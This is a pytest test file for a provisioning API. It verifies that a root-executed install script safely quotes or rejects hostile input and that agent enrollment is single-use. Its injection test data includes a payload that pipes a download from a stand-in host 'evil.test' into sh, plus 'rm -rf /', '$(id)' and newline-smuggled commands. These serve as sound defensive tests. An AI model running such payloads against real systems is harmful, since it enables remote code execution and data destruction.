"""Provisioning: the install script must never hand a shell an unquoted value,
and enrollment must be single-use and hand out only what the token allows."""
from __future__ import annotations

import shlex

import pytest
from cryptography import x509
from cryptography.x509.oid import ExtendedKeyUsageOID
from sqlmodel import select

from app.models import Agent, LoadBalancer, ProvisioningToken, ProvisionStatus, Server, SyncStatus
from app.routers.provision import _render_install_script
from tests.test_pki import make_csr


def _create_token(client, headers, **overrides):
    payload = {"name": "edge-1", "method": "docker"}
    payload.update(overrides)
    return client.post("/api/provision/tokens", json=payload, headers=headers)


def _enroll(client, token, **overrides):
    csr, _ = make_csr()
    body = {"csr_pem": csr, "hostname": "edge-1", "address": "10.0.0.9", "port": 8443,
            "os": "linux", "arch": "amd64", "agent_version": "0.1.0"}
    body.update(overrides)
    return client.post(f"/api/provision/{token}/enroll", json=body)


# --------------------------------------------------------------------------- #
# S1 — command injection into the root-executed install script
# --------------------------------------------------------------------------- #
INJECTION_NAMES = [
    "x'; curl http://evil.test/x | sh; echo '",
    "x'; rm -rf /; '",
    'x"; touch /tmp/pwned; "',
    "x$(id)",
    "x`id`",
    "x\nrm -rf /\n",
    "x'\nwhoami\n'",
]


@pytest.mark.parametrize("evil", INJECTION_NAMES)
def test_injection_in_name_never_reaches_a_shell_line(client, editor_headers, evil):
    """The name only ever appears in a comment, and a newline is rejected."""
    resp = _create_token(client, editor_headers, name=evil)
    if resp.status_code == 422:
        return
    assert resp.status_code == 200, resp.text
    script = client.get(f"/api/provision/{resp.json()['token']}/install.sh").text
    for line in script.splitlines():
        if evil.strip() in line:
            assert line.startswith("#"), line
    assert not any(ln.strip().startswith(("rm -rf", "curl http://evil", "touch /tmp")) for ln in script.splitlines())


def test_newline_in_name_is_rejected(client, editor_headers):
    assert _create_token(client, editor_headers, name="ok\nrm -rf /").status_code == 422


def test_install_script_comment_cannot_be_escaped(session):
    """Rows predating validation still render into a root-run script."""
    t = ProvisioningToken(
        token="tok-legacy",
        name="legacy\nrm -rf /\n# ",
        expires_at=__import__("datetime").datetime.now(__import__("datetime").timezone.utc),
    )
    script = _render_install_script(t)
    header = script.splitlines()[1]
    assert header.startswith("#") and "\n" not in header
    assert not any(ln.strip().startswith("rm -rf") for ln in script.splitlines())


def test_install_script_quotes_every_interpolated_value(client, editor_headers):
    token = _create_token(client, editor_headers, name="edge-1", connect_address="agh.example.com", agent_port=9443).json()["token"]
    script = client.get(f"/api/provision/{token}/install.sh").text
    for var in ("BASE_URL=", "TOKEN=", "LISTEN=", "ADDRESS="):
        line = next(ln for ln in script.splitlines() if ln.startswith(var))
        assert len(shlex.split(line)) == 1, line
    assert shlex.split(next(ln for ln in script.splitlines() if ln.startswith("TOKEN=")))[0] == f"TOKEN={token}"
    assert "LISTEN=0.0.0.0:9443" in script
    assert "ADDRESS=agh.example.com" in script
    # Nothing fetched from the control plane is executed: no eval, no sourced config.
    assert "eval" not in script and "/config" not in script
    assert "sha256sum" in script  # the download is checksum-verified


@pytest.mark.parametrize("bad", [
    "evil.test/../../x", "http://evil.test", "host with spaces", "host;rm -rf /", "a" * 300, "-leading-hyphen.test",
])
def test_bad_connect_address_rejected(client, editor_headers, bad):
    assert _create_token(client, editor_headers, name="edge-1", connect_address=bad).status_code == 422


@pytest.mark.parametrize("good", ["agh.example.com", "10.0.0.5", "host-1", "::1"])
def test_good_connect_address_accepted(client, editor_headers, good):
    assert _create_token(client, editor_headers, name="edge-1", connect_address=good).status_code == 200


def test_dnsdist_role_requires_a_zone(client, editor_headers, zone):
    assert _create_token(client, editor_headers, roles=["adguard", "dnsdist"]).status_code == 400
    assert _create_token(client, editor_headers, roles=["dnsdist"], zone_id=zone.id).status_code == 200
    assert _create_token(client, editor_headers, roles=[]).status_code == 422
    assert _create_token(client, editor_headers, roles=["shell"]).status_code == 422


def test_token_creation_requires_editor(client, viewer_headers):
    assert _create_token(client, viewer_headers, name="edge-1").status_code == 403


# --------------------------------------------------------------------------- #
# S2 — enrollment is single-use and hands out exactly what the token allows
# --------------------------------------------------------------------------- #
def test_enroll_creates_agent_server_and_balancer_per_roles(client, editor_headers, session, zone):
    token = _create_token(client, editor_headers, roles=["adguard", "dnsdist"], zone_id=zone.id,
                          vrrp_priority=150, expose_web_ui=True, prune=True).json()
    resp = _enroll(client, token["token"])
    assert resp.status_code == 200, resp.text
    body = resp.json()
    assert "BEGIN CERTIFICATE" in body["cert_pem"] and "BEGIN CERTIFICATE" in body["ca_pem"]

    agent = session.get(Agent, body["agent_id"])
    assert agent.url == "https://10.0.0.9:8443" and agent.zone_id == zone.id and agent.arch == "amd64"
    server = session.exec(select(Server).where(Server.agent_id == agent.id)).one()
    assert server.url == "https://10.0.0.9:8443/v1/adguard/api"
    assert server.tls_cert == "@agent" and server.status == SyncStatus.provisioning
    assert server.prune is True and server.expose_web_ui is True
    lb = session.exec(select(LoadBalancer).where(LoadBalancer.agent_id == agent.id)).one()
    assert lb.zone_id == zone.id and lb.vrrp_priority == 150

    row = session.exec(select(ProvisioningToken).where(ProvisioningToken.token == token["token"])).one()
    assert row.status == ProvisionStatus.completed
    assert (row.agent_id, row.server_id, row.load_balancer_id) == (agent.id, server.id, lb.id)

    cert = x509.load_pem_x509_certificate(body["cert_pem"].encode())
    san = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName).value
    assert san.get_values_for_type(x509.IPAddress)[0].exploded == "10.0.0.9"
    assert list(cert.extensions.get_extension_for_class(x509.ExtendedKeyUsage).value) == [ExtendedKeyUsageOID.SERVER_AUTH]


def test_enroll_with_only_dnsdist_role_creates_no_server(client, editor_headers, session, zone):
    token = _create_token(client, editor_headers, roles=["dnsdist"], zone_id=zone.id).json()
    resp = _enroll(client, token["token"])
    assert resp.status_code == 200
    assert session.query(Server).count() == 0
    assert session.query(LoadBalancer).count() == 1


def test_enroll_is_single_use(client, editor_headers):
    token = _create_token(client, editor_headers).json()["token"]
    assert _enroll(client, token).status_code == 200
    replay = _enroll(client, token)
    assert replay.status_code == 409
    assert client.get(f"/api/provision/{token}/install.sh").status_code == 409


def test_revoked_token_cannot_enroll(client, editor_headers):
    created = _create_token(client, editor_headers).json()
    client.post(f"/api/provision/tokens/{created['id']}/revoke", headers=editor_headers)
    assert _enroll(client, created["token"]).status_code == 410
    assert client.get(f"/api/provision/{created['token']}/install.sh").status_code == 410


def test_unknown_token_cannot_enroll(client):
    assert _enroll(client, "nope").status_code == 404


def test_preconfigured_connect_address_wins_over_reported_one(client, editor_headers, session):
    token = _create_token(client, editor_headers, connect_address="dns-a.lan").json()["token"]
    resp = _enroll(client, token, address="10.0.0.99")
    assert resp.status_code == 200
    agent = session.get(Agent, resp.json()["agent_id"])
    assert agent.address == "dns-a.lan" and agent.url == "https://dns-a.lan:8443"


@pytest.mark.parametrize("bad", ["evil.test/path#", "http://evil.test", "host;rm -rf /"])
def test_enroll_rejects_non_host_address(client, editor_headers, bad):
    token = _create_token(client, editor_headers).json()["token"]
    assert _enroll(client, token, address=bad).status_code == 422


def test_enroll_without_any_address_is_refused(client, editor_headers, session):
    token = _create_token(client, editor_headers).json()["token"]
    resp = _enroll(client, token, address=None)
    assert resp.status_code == 400
    assert session.query(Agent).count() == 0


def test_enroll_brackets_ipv6_address(client, editor_headers, session):
    token = _create_token(client, editor_headers).json()["token"]
    resp = _enroll(client, token, address="fd00::1")
    assert resp.status_code == 200, resp.text
    agent = session.get(Agent, resp.json()["agent_id"])
    assert agent.url == "https://[fd00::1]:8443"


def test_enroll_rejects_garbage_csr(client, editor_headers, session):
    token = _create_token(client, editor_headers).json()["token"]
    assert _enroll(client, token, csr_pem="-----BEGIN CERTIFICATE REQUEST-----\nAAAA\n-----END CERTIFICATE REQUEST-----").status_code == 400
    assert _enroll(client, token, csr_pem="not a csr").status_code == 422
    # The token is still usable after a bad attempt.
    assert _enroll(client, token).status_code == 200


def test_old_secret_endpoints_are_gone(client, editor_headers):
    """The flow that eval'd a fetched config and downloaded a private key is removed."""
    token = _create_token(client, editor_headers).json()["token"]
    for path in ("config", "key.pem", "cert.pem"):
        assert client.get(f"/api/provision/{token}/{path}").status_code == 404
    assert client.post(f"/api/provision/{token}/complete", json={"address": "10.0.0.9"}).status_code in (404, 405)
